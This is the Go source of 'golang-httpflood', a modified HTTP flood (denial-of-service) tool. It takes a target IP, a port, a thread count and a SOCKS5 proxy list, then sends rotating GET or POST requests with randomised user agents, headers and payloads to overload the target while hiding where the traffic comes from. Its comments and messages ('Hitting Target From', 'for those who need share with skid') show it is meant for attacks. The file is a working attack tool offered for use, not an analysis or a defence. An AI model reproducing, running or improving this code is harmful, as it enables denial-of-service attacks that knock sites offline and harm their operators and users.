/*

golang-httpflood by Leeon123 (https://github.com/Leeon123/golang-httpflood)

==========

Modified by sphinxid

20200325
- support socks5 proxy

20200329
- support http post
- change random string into %%RAND%% in url path

20201018
- support socks5 with auth (username:password)

*/

package main

import (
	"bufio"
        "crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"strconv"
	"time"
	"strings"

	"golang.org/x/net/proxy"
)

var (
	socks_list = make([]string, 0, 4)
	g_socks_list = make([]string, 0, 4)
	start      = make(chan bool)
	UserAgents = []string{
		"Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
		"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
		"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
		"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
		"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
		"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
		"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
		"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
		"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
		"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
		"Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a",
		"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2",
		"Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
		"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
		"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
		"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
		"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
		"Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
		"Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
		"Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
		"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
		"Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2",
		"Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
		"Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
		"Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
		"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
		"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
		"Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
		"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
		"Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
		"Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
		"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
		"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
		"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
		"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
		"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
		"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
		"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
		"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
		"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
		"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
		"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
		"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
	}
	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
	acceptall = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
    referers = []string{
    	"https://www.google.com/search?q=",
    	"https://check-host.net/",
    	"https://www.facebook.com/",
    	"https://www.youtube.com/",
    	"https://www.fbi.com/",
    	"https://www.bing.com/search?q=",
    	"https://r.search.yahoo.com/"}

	page string
)

func contain(char string, x string) int {
        times := 0
        ans := 0
        for i := 0; i < len(char); i++ {
                if char[times] == x[0] {
                        ans = 1
                }
                times++
        }
        return ans
}

func getRandString02() string {
  abcde := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
  str := string(string(abcde[rand.Intn(len(abcde))])) + string(string(abcde[rand.Intn(len(abcde))])) + string(string(abcde[rand.Intn(len(abcde))])) + string(string(abcde[rand.Intn(len(abcde))])) + string(string(abcde[rand.Intn(len(abcde))])) + string(string(abcde[rand.Intn(len(abcde))])) + string(string(abcde[rand.Intn(len(abcde))])) + string(string(abcde[rand.Intn(len(abcde))]))

  return str
}

func getRandString() string {
  //str := strconv.Itoa(rand.Intn(1000000000000000000)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + strconv.Itoa(rand.Intn(1000000000000000000)) + string(abcd[rand.Intn(len(abcd))])
  str := strconv.Itoa(rand.Intn(1000000)) + string(string(abcd[rand.Intn(len(abcd))])) + string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))
  str += string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))
  str += strconv.Itoa(rand.Intn(1000000)) + string(string(abcd[rand.Intn(len(abcd))])) + string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))
  str += string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))+ string(string(abcd[rand.Intn(len(abcd))]))

  return str
}

func flood() {
    ip := os.Args[1]
	host := os.Args[1]
	addr := ""
        hostHeader := ""

        if len(os.Args) == 10 && os.Args[9] != "" {
		hostHeader = os.Args[9]
	}

	addr2, err := net.LookupHost(host)
	if err != nil {
		addr = host
	} else {
		addr = addr2[0]
	}

	//addr = host
	addr += ":"
	addr += os.Args[2]

	httpMode := os.Args[8]

	var s net.Conn
	<-start
	for {

		c_socks_list := socks_list
		nlen := len(c_socks_list)

		num := 0
		if nlen > 0 {
			num = rand.Intn(nlen)
		}

		socks_addr := c_socks_list[num]
		mysocks := strings.Split(socks_addr, ":")
		mysocks_addr := mysocks[0] + ":" + mysocks[1]


		// default no auth ( get from ENV variable PROXYAUTH="username:password" )
		socks, err := proxy.SOCKS5("tcp", mysocks_addr, nil, proxy.Direct)

		// socks with auth
		if (len(mysocks) == 4) {
                        socks_auth := &proxy.Auth{}
                        socks_auth.User = mysocks[2]
                        socks_auth.Password = mysocks[3]

			socks, err = proxy.SOCKS5("tcp", mysocks_addr, socks_auth, proxy.Direct)
		}

		if err != nil {
			fmt.Fprintln(os.Stderr, "Can't connect to the proxy:", err)

			copy(c_socks_list[num:], c_socks_list[num+1:]) // Shift a[i+1:] left one index.
			c_socks_list[len(c_socks_list)-1] = ""     // Erase last element (write zero value).
			c_socks_list = c_socks_list[:len(c_socks_list)-1]     // Truncate slice.
			socks_list = c_socks_list

			continue
		}

		for {
			s, err = socks.Dial("tcp", addr)

			if err != nil {
				//fmt.Println("Connection Down!!!  | " + socks_addr) //for those who need share with skid

				//copy(c_socks_list[num:], c_socks_list[num+1:]) // Shift a[i+1:] left one index.
				//c_socks_list[len(c_socks_list)-1] = ""     // Erase last element (write zero value).
				//c_socks_list = c_socks_list[:len(c_socks_list)-1]     // Truncate slice.
				//socks_list = c_socks_list

				break
			} else {
				//defer s.Close()
				if os.Args[7] == "ssl" {
    					s = tls.Client(s, &tls.Config{ServerName: ip,InsecureSkipVerify: true,})
				}
				fmt.Println("Hitting Target From | " + socks_addr) //for those who need share with skid
				nloop := 100
				for i := 0; i < nloop; i++ {

					request := ""
					if httpMode == "get" {
						request += "GET /" + os.Args[6] + " HTTP/1.1\r\n"

						if hostHeader != "" {
							request += "Host: " + hostHeader + "\r\n"
						} else {
							request += "Host: " + host +"\r\n"
						}

						request += "User-Agent: " + UserAgents[rand.Intn(len(UserAgents))] + "\r\n"
						request += acceptall[rand.Intn(len(acceptall))]
						request += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n\r\n"
					} else {

						postData := getRandString() + getRandString()

                                                request += "POST /" + os.Args[6] + " HTTP/1.1\r\n"

                                                if hostHeader != "" {
                                                        request += "Host: " + hostHeader + "\r\n"
                                                } else {
                                                        request += "Host: " + host +"\r\n"
                                                }

                                                request += "Connection: Keep-Alive\r\n"
                                                request += "User-Agent: " + UserAgents[rand.Intn(len(UserAgents))] + "\r\n"
						//request += "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n"
						request += "Content-Type: text/plain\r\n"
                                                request += "Accept-Encoding: gzip, deflate" + "\r\n"
						request += "Content-Length: " + strconv.Itoa(len(postData)) + "\r\n\r\n"
						request += postData
					}

					if contain(request, "%%RAND%%") > 0 {
						request = strings.ReplaceAll(request,"%%RAND%%", getRandString())
					}
					if contain(request, "%%RAND8%%") > 0 {
						//rand8_string := string(getRandString()[0:8])
						request = strings.ReplaceAll(request,"%%RAND8%%", getRandString02())
					}

					time.Sleep( 80 * time.Millisecond )
					s.Write([]byte(request))
					//fmt.Println(request)
				}
			}
			// delay
			//time.Sleep(time.Millisecond * 300)
		}
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())
	if len(os.Args) < 9 {
		fmt.Println("n = ", len(os.Args))
		fmt.Println("Usage: ", os.Args[0], "<ip> <port> <threads> <seconds> <list> <path> <plain/ssl> <get/post> [optinal target hostname]")
		os.Exit(1)
	}
	var threads, _ = strconv.Atoi(os.Args[3])
	var limit, _ = strconv.Atoi(os.Args[4])
	fi, err := os.Open(os.Args[5])
	if err != nil {
		fmt.Printf("Error: %s\n", err)
		return
	}
	defer fi.Close()
	br := bufio.NewReader(fi)
        if contain(os.Args[6], "?") == 0 {
                page = "?"
        } else {
                page = "&"
        }
	for {
		a, _, c := br.ReadLine()
		if c == io.EOF {
			break
		}
		socks_list = append(socks_list, string(a))
	}
	fmt.Println("Proxies numbers: " + strconv.Itoa(len(socks_list))) //for those who need share with skid
	for i := 1; i <= threads; i++ {
		time.Sleep(time.Millisecond * 1)
		go flood()                                           // Start threads
		fmt.Printf("\rThreads [%.0f] are ready", float64(i)) //for those who need share with skid
		os.Stdout.Sync()
	}
	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
	close(start)
	time.Sleep(time.Duration(limit) * time.Second)
	//Keep the threads continue
}
